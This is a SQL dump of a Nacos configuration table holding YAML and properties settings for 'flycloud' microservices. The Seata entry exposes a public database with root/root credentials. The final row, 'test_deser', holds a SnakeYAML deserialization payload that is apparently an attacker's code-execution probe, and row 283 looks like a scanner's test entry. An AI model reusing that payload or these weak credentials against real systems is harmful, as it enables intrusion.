    dynamic:
      # 设置默认的数据源或者数据源组,默认值即为 master
      primary: master
      datasource:
        # 主库数据源
        master:
          type: ${spring.datasource.type}
          driver-class-name: com.mysql.cj.jdbc.Driver
          url: ${datasource.system-master.url}
          username: ${datasource.system-master.username}
          password: ${datasource.system-master.password}


#       其他数据库系统-参数说明:          
#        oracle:
#          type: ${spring.datasource.type}
#          driverClassName: oracle.jdbc.OracleDriver
#          url: ${datasource.system-oracle.url}
#          username: ${datasource.system-oracle.username}
#          password: ${datasource.system-oracle.password}
#          hikari:
#            connectionTestQuery: SELECT 1 FROM DUAL

#        postgres:
#          type: ${spring.datasource.type}
#          driverClassName: org.postgresql.Driver
#          url: ${datasource.system-postgres.url}
#          username: ${datasource.system-postgres.username}
#          password: ${datasource.system-postgres.password}



# 服务资源安全配置
server:
  resource:
    security:

      # 客户端标识 ID
      client-id: fly

      # 客户端安全码
      client-secret: fly_secret

      # 客户端访问范围
      scopes:

      # 白名单 (对外直接暴露服务资源的URL)
      ignore-urls:
        # - /v3/api-docs/**   
        - /feign/**



', '3735d9c134c24aa4dfee76a8ea6e73e7', '2024-09-02 09:51:03', '2025-05-10 15:52:15', 'nacos', '119.34.166.84', '', 'c5ab8826-7c54-44ee-a089-49a3dd530652', '', '', '', 'yaml', '');
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (275, 'flycloud-job-prod.yaml', 'DEFAULT_GROUP', '
spring:
  datasource:
    type: ${spring.datasource.type}
    driver-class-name: com.mysql.cj.jdbc.Driver
    url: ${datasource.job.url}
    username: ${datasource.job.username}
    password: ${datasource.job.password}

#        oracle:
#          type: ${spring.datasource.type}
#          driverClassName: oracle.jdbc.OracleDriver
#          url: ${datasource.system-oracle.url}
#          username: ${datasource.system-oracle.username}
#          password: ${datasource.system-oracle.password}
#          hikari:
#            connectionTestQuery: SELECT 1 FROM DUAL

#        postgres:
#          type: ${spring.datasource.type}
#          driverClassName: org.postgresql.Driver
#          url: ${datasource.system-postgres.url}
#          username: ${datasource.system-postgres.username}
#          password: ${datasource.system-postgres.password}


xxl:
  job:
    # 执行器开关
    enabled: true
    # 调度中心地址：如调度中心集群部署存在多个地址则用逗号分隔。
    # admin-addresses: http://localhost:9900
    # 调度中心应用名 通过服务名连接调度中心(启用admin-appname会导致admin-addresses不生效)
    admin-appname: fly-xxl-job-admin
    # 执行器通讯TOKEN：非空时启用
    access-token: xxl-job
    # 执行器配置
    executor:
      # 执行器AppName：执行器心跳注册分组依据；为空则关闭自动注册
      appname: ${spring.application.name}-executor
      # 执行器端口号 执行器从19901开始往后写
      port: 9901
      # 执行器注册：默认IP:PORT
      address:
      # 执行器IP：默认自动获取IP
      ip:
      # 执行器运行日志文件存储磁盘路径
      logpath: ./logs/${spring.application.name}/xxl-job
      # 执行器日志文件保存天数：大于3生效
      logretentiondays: 30', '855f2453b75b7bc1f28568d1f965ff5a', '2024-09-02 09:51:03', '2024-09-02 09:51:03', null, '119.34.164.140', '', 'c5ab8826-7c54-44ee-a089-49a3dd530652', null, null, null, 'yaml', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (276, 'flycloud-mall-prod.yaml', 'DEFAULT_GROUP', '
spring:
  datasource:
    dynamic:
      # 设置默认的数据源或者数据源组,默认值即为 master
      primary: master
      datasource:
        # 主库数据源
        master:
          type: ${spring.datasource.type}
          driver-class-name: com.mysql.cj.jdbc.Driver
          url: ${datasource.mall-master.url}
          username: ${datasource.mall-master.username}
          password: ${datasource.mall-master.password}


#       其他数据库系统-参数说明:          
#        oracle:
#          type: ${spring.datasource.type}
#          driverClassName: oracle.jdbc.OracleDriver
#          url: ${datasource.mall-oracle.url}
#          username: ${datasource.mall-oracle.username}
#          password: ${datasource.mall-oracle.password}
#          hikari:
#            connectionTestQuery: SELECT 1 FROM DUAL

#        postgres:
#          type: ${spring.datasource.type}
#          driverClassName: org.postgresql.Driver
#          url: ${datasource.mall-postgres.url}
#          username: ${datasource.mall-postgres.username}
#          password: ${datasource.mall-postgres.password}
', 'a8815931a4ab595219486f36619f3156', '2024-09-02 09:51:03', '2024-09-02 09:51:03', null, '119.34.164.140', '', 'c5ab8826-7c54-44ee-a089-49a3dd530652', null, null, null, 'yaml', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (277, 'flycloud-music-prod.yaml', 'DEFAULT_GROUP', '
spring:
  datasource:
    dynamic:
      # 设置默认的数据源或者数据源组,默认值即为 master
      primary: master
      datasource:
        # 主库数据源
        master:
          type: ${spring.datasource.type}
          driver-class-name: com.mysql.cj.jdbc.Driver
          url: ${datasource.music-master.url}
          username: ${datasource.music-master.username}
          password: ${datasource.music-master.password}


#       其他数据库系统-参数说明:          
#        oracle:
#          type: ${spring.datasource.type}
#          driverClassName: oracle.jdbc.OracleDriver
#          url: ${datasource.music-oracle.url}
#          username: ${datasource.music-oracle.username}
#          password: ${datasource.music-oracle.password}
#          hikari:
#            connectionTestQuery: SELECT 1 FROM DUAL

#        postgres:
#          type: ${spring.datasource.type}
#          driverClassName: org.postgresql.Driver
#          url: ${datasource.music-postgres.url}
#          username: ${datasource.music-postgres.username}
#          password: ${datasource.music-postgres.password}
', 'f03cd2776ac489e9528efeb47540fc06', '2024-09-02 09:51:03', '2024-09-02 09:51:03', null, '119.34.164.140', '', 'c5ab8826-7c54-44ee-a089-49a3dd530652', null, null, null, 'yaml', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (278, 'seata-server.properties', 'DEFAULT_GROUP', '
service.vgroupMapping.ruoyi-auth-group=default
service.vgroupMapping.ruoyi-system-group=default
service.vgroupMapping.ruoyi-resource-group=default
service.vgroupMapping.ruoyi-gen-group=default
service.vgroupMapping.ruoyi-job-group=default

service.enableDegrade=false
service.disableGlobalTransaction=false

#Transaction storage configuration, only for the server. The file, DB, and redis configuration values are optional.
store.mode=db
store.lock.mode=db
store.session.mode=db
#Used for password encryption
store.publicKey=

#These configurations are required if the `store mode` is `db`. If `store.mode,store.lock.mode,store.session.mode` are not equal to `db`, you can remove the configuration block.
store.db.datasource=hikari
store.db.dbType=mysql
store.db.driverClassName=com.mysql.cj.jdbc.Driver
store.db.url=jdbc:mysql://39.98.125.88/fly-seata?useUnicode=true&rewriteBatchedStatements=true
store.db.user=root
store.db.password=root
store.db.minConn=5
store.db.maxConn=30
store.db.globalTable=global_table
store.db.branchTable=branch_table
store.db.distributedLockTable=distributed_lock
store.db.queryLimit=100
store.db.lockTable=lock_table
store.db.maxWait=5000

# redis 模式 store.mode=redis 开启 (控制台查询功能有限,不影响实际执行功能)
# store.redis.host=127.0.0.1
# store.redis.port=6379
# 最大连接数
# store.redis.maxConn=10
# 最小连接数
# store.redis.minConn=1
# store.redis.database=0
# store.redis.password=
# store.redis.queryLimit=100

#Transaction rule configuration, only for the server
server.recovery.committingRetryPeriod=1000
server.recovery.asynCommittingRetryPeriod=1000
server.recovery.rollbackingRetryPeriod=1000
server.recovery.timeoutRetryPeriod=1000
server.maxCommitRetryTimeout=-1
server.maxRollbackRetryTimeout=-1
server.rollbackRetryTimeoutUnlockEnable=false
server.distributedLockExpireTime=10000
server.xaerNotaRetryTimeout=60000
server.session.branchAsyncQueueSize=5000
server.session.enableBranchAsyncRemove=false

#Transaction rule configuration, only for the client
client.rm.asyncCommitBufferLimit=10000
client.rm.lock.retryInterval=10
client.rm.lock.retryTimes=30
client.rm.lock.retryPolicyBranchRollbackOnConflict=true
client.rm.reportRetryCount=5
client.rm.tableMetaCheckEnable=true
client.rm.tableMetaCheckerInterval=60000
client.rm.sqlParserType=druid
client.rm.reportSuccessEnable=false
client.rm.sagaBranchRegisterEnable=false
client.rm.sagaJsonParser=fastjson
client.rm.tccActionInterceptorOrder=-2147482648
client.tm.commitRetryCount=5
client.tm.rollbackRetryCount=5
client.tm.defaultGlobalTransactionTimeout=60000
client.tm.degradeCheck=false
client.tm.degradeCheckAllowTimes=10
client.tm.degradeCheckPeriod=2000
client.tm.interceptorOrder=-2147482648
client.undo.dataValidation=true
client.undo.logSerialization=jackson
client.undo.onlyCareUpdateColumns=true
server.undo.logSaveDays=7
server.undo.logDeletePeriod=86400000
client.undo.logTable=undo_log
client.undo.compress.enable=true
client.undo.compress.type=zip
client.undo.compress.threshold=64k

#For TCC transaction mode
tcc.fence.logTableName=tcc_fence_log
tcc.fence.cleanPeriod=1h

#Log rule configuration, for client and server
log.exceptionRate=100

#Metrics configuration, only for the server
metrics.enabled=false
metrics.registryType=compact
metrics.exporterList=prometheus
metrics.exporterPrometheusPort=9898

#For details about configuration items, see https://seata.io/zh-cn/docs/user/configurations.html
#Transport configuration, for client and server
transport.type=TCP
transport.server=NIO
transport.heartbeat=true
transport.enableTmClientBatchSendRequest=false
transport.enableRmClientBatchSendRequest=true
transport.enableTcServerBatchSendResponse=false
transport.rpcRmRequestTimeout=30000
transport.rpcTmRequestTimeout=30000
transport.rpcTcRequestTimeout=30000
transport.threadFactory.bossThreadPrefix=NettyBoss
transport.threadFactory.workerThreadPrefix=NettyServerNIOWorker
transport.threadFactory.serverExecutorThreadPrefix=NettyServerBizHandler
transport.threadFactory.shareBossWorker=false
transport.threadFactory.clientSelectorThreadPrefix=NettyClientSelector
transport.threadFactory.clientSelectorThreadSize=1
transport.threadFactory.clientWorkerThreadPrefix=NettyClientWorkerThread
transport.threadFactory.bossThreadSize=1
transport.threadFactory.workerThreadSize=default
transport.shutdown.wait=3
transport.serialization=seata
transport.compressor=none
', '157c6b7c012629f23ad96a09fee01d82', '2024-09-02 09:51:03', '2024-09-02 09:51:03', null, '119.34.164.140', '', 'c5ab8826-7c54-44ee-a089-49a3dd530652', null, null, null, 'properties', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (279, 'flycloud-generator-prod.yaml', 'DEFAULT_GROUP', '
spring:
  datasource:
    dynamic:
      # 设置默认的数据源或者数据源组,默认值即为 master
      primary: master
      datasource:
        # 主库数据源
        master:
          type: ${spring.datasource.type}
          driver-class-name: com.mysql.cj.jdbc.Driver
          url: ${datasource.system-master.url}
          username: ${datasource.system-master.username}
          password: ${datasource.system-master.password}


#        oracle:
#          type: ${spring.datasource.type}
#          driverClassName: oracle.jdbc.OracleDriver
#          url: ${datasource.system-oracle.url}
#          username: ${datasource.system-oracle.username}
#          password: ${datasource.system-oracle.password}
#          hikari:
#            connectionTestQuery: SELECT 1 FROM DUAL

#        postgres:
#          type: ${spring.datasource.type}
#          driverClassName: org.postgresql.Driver
#          url: ${datasource.system-postgres.url}
#          username: ${datasource.system-postgres.username}
#          password: ${datasource.system-postgres.password}

# 代码生成 配置
gen:
  # 作者
  author: fly
  # 默认生成包路径 system 需改成自己的模块名称 如 system monitor tool
  packageName: com.fly.system
  # 自动去除表前缀，默认是false
  autoRemovePre: false
  # 表前缀（生成类名不会包含表前缀，多个用逗号分隔）
  tablePrefix: sys_', 'f266a6b3de235c6628c4d0694d2e993e', '2024-09-02 09:51:03', '2024-09-02 09:51:03', null, '119.34.164.140', '', 'c5ab8826-7c54-44ee-a089-49a3dd530652', '', null, null, 'yaml', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (280, 'flycloud-test-prod.yaml', 'DEFAULT_GROUP', '
spring:
  datasource:
    dynamic:
      # 设置默认的数据源或者数据源组,默认值即为 master
      primary: master
      datasource:
        # 主库数据源
        master:
          type: ${spring.datasource.type}
          driver-class-name: com.mysql.cj.jdbc.Driver
          url: ${datasource.system-master.url}
          username: ${datasource.system-master.username}
          password: ${datasource.system-master.password}
', '8e2306d55b225ae3992b1afad4042639', '2024-09-02 09:51:03', '2024-09-02 09:51:03', null, '119.34.164.140', '', 'c5ab8826-7c54-44ee-a089-49a3dd530652', null, null, null, 'yaml', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (281, 'flycloud-auth-prod.yaml', 'DEFAULT_GROUP', '
spring:
  datasource:
    dynamic:
      # 设置默认的数据源或者数据源组,默认值即为 master
      primary: master
      datasource:
        # 主库数据源
        master:
          type: ${spring.datasource.type}
          driver-class-name: com.mysql.cj.jdbc.Driver
          url: ${datasource.system-master.url}
          username: ${datasource.system-master.username}
          password: ${datasource.system-master.password}

# 服务资源安全配置
server:
  resource:
    security:

      # 客户端标识 ID
      client-id: flycloud-system

      # 客户端安全码
      client-secret: root

      # 授权类型
      # grant-types: 3
      grant-types: password

      # token有效期
      token-validity-time: 7200

      # refresh-token有效期
      refresh-token-validity-time: 7200

      # 客户端访问范围
      scopes:

      # 白名单 (对外直接暴露服务资源的URL)
      ignore-urls:
        # - /v3/api-docs/**  
        - /oauth/**
        - /auth/**
', '813ebd7bf6dbe22824abf4c7a6b98b57', '2024-09-02 09:51:27', '2024-09-02 10:01:42', 'nacos', '61.140.102.252', '', 'c5ab8826-7c54-44ee-a089-49a3dd530652', '', '', '', 'yaml', '');
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (282, 'flycloud-file-admin-prod.yaml', 'DEFAULT_GROUP', '
spring:
  datasource:
    dynamic:
      # 设置默认的数据源或者数据源组,默认值即为 master
      primary: master
      datasource:
        # 主库数据源
        master:
          type: ${spring.datasource.type}
          driver-class-name: com.mysql.cj.jdbc.Driver
          url: ${datasource.system-master.url}
          username: ${datasource.system-master.username}
          password: ${datasource.system-master.password}


#       其他数据库系统-参数说明:          
#        oracle:
#          type: ${spring.datasource.type}
#          driverClassName: oracle.jdbc.OracleDriver
#          url: ${datasource.system-oracle.url}
#          username: ${datasource.system-oracle.username}
#          password: ${datasource.system-oracle.password}
#          hikari:
#            connectionTestQuery: SELECT 1 FROM DUAL

#        postgres:
#          type: ${spring.datasource.type}
#          driverClassName: org.postgresql.Driver
#          url: ${datasource.system-postgres.url}
#          username: ${datasource.system-postgres.username}
#          password: ${datasource.system-postgres.password}



# 服务资源安全配置
server:
  resource:
    security:

      # 客户端标识 ID
      client-id: fly

      # 客户端安全码
      client-secret: fly_secret

      # 客户端访问范围
      scopes:

      # 白名单 (对外直接暴露服务资源的URL)
      ignore-urls:
        # - /v3/api-docs/**   
        # - /provider/**



', '67b00db563365dc21b472190b4d377f3', '2024-09-02 09:51:27', '2024-09-02 09:51:27', null, '119.34.164.140', '', 'c5ab8826-7c54-44ee-a089-49a3dd530652', null, null, null, 'yaml', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (283, 'nacos.cfg.dataIdfoo', 'foo', 'helloWorld', '1a833da63a6b7e20098dae06d06602e1', '2024-10-25 02:45:43', '2026-02-25 10:31:06', null, '85.120.228.180', '', '', null, null, null, 'text', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (297, 'flycloud-bpm-dev.yaml', 'DEFAULT_GROUP', '
spring:
  datasource:
    dynamic:
      # 设置默认的数据源或者数据源组,默认值即为 master
      primary: master
      datasource:
        # 主库数据源
        master:
          type: ${spring.datasource.type}
          driver-class-name: com.mysql.cj.jdbc.Driver
          url: ${datasource.bpm-master.url}
          username: ${datasource.bpm-master.username}
          password: ${datasource.bpm-master.password}


# 服务资源安全配置
server:
  resource:
    security:

      # 客户端标识 ID
      client-id: fly

      # 客户端安全码
      client-secret: fly_secret

      # 客户端访问范围
      scopes:

      # 白名单 (对外直接暴露服务资源的URL)
      ignore-urls:
        # - /v3/api-docs/**   
        - /provider/**



', '00cb332aea4d991aa918bda3b22e91cf', '2024-11-29 12:48:05', '2024-11-30 02:46:04', 'nacos', '113.88.70.177', '', '', '', '', '', 'yaml', '');
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (300, 'flycloud-bpm-prod.yaml', 'DEFAULT_GROUP', '
spring:
  datasource:
    dynamic:
      # 设置默认的数据源或者数据源组,默认值即为 master
      primary: master
      datasource:
        # 主库数据源
        master:
          type: ${spring.datasource.type}
          driver-class-name: com.mysql.cj.jdbc.Driver
          url: ${datasource.bpm-master.url}
          username: ${datasource.bpm-master.username}
          password: ${datasource.bpm-master.password}


# 服务资源安全配置
server:
  resource:
    security:

      # 客户端标识 ID
      client-id: fly

      # 客户端安全码
      client-secret: fly_secret

      # 客户端访问范围
      scopes:

      # 白名单 (对外直接暴露服务资源的URL)
      ignore-urls:
        # - /v3/api-docs/**   
        - /provider/**



', '00cb332aea4d991aa918bda3b22e91cf', '2025-05-10 15:14:44', '2025-05-10 15:14:57', 'nacos', '116.21.158.250', '', 'c5ab8826-7c54-44ee-a089-49a3dd530652', '', '', '', 'yaml', '');
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (313, 'service.vgroupMapping.fly_tx_group', 'SEATA_GROUP', 'default', 'c21f969b5f03d33d43e04f8f136e7682', '2025-08-16 04:31:44', '2025-08-16 04:32:21', 'nacos', '116.22.166.185', '', '', '', '', '', 'properties', '');
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (316, 'service.vgroupMapping.fly_tx_group', 'SEATA_GROUP', 'default', 'c21f969b5f03d33d43e04f8f136e7682', '2025-08-16 08:49:09', '2025-08-16 08:49:09', null, '116.22.166.185', '', 'c5ab8826-7c54-44ee-a089-49a3dd530652', '', null, null, 'properties', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (317, 'test_deser', 'DEFAULT_GROUP', '!!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL ["http://127.0.0.1/"] ]]]', '873261291c0a60f9a1afa7ac11b9c83a', '2025-08-17 23:44:54', '2025-08-17 23:44:54', null, '110.40.43.77', '', '', null, null, null, 'yaml', null);
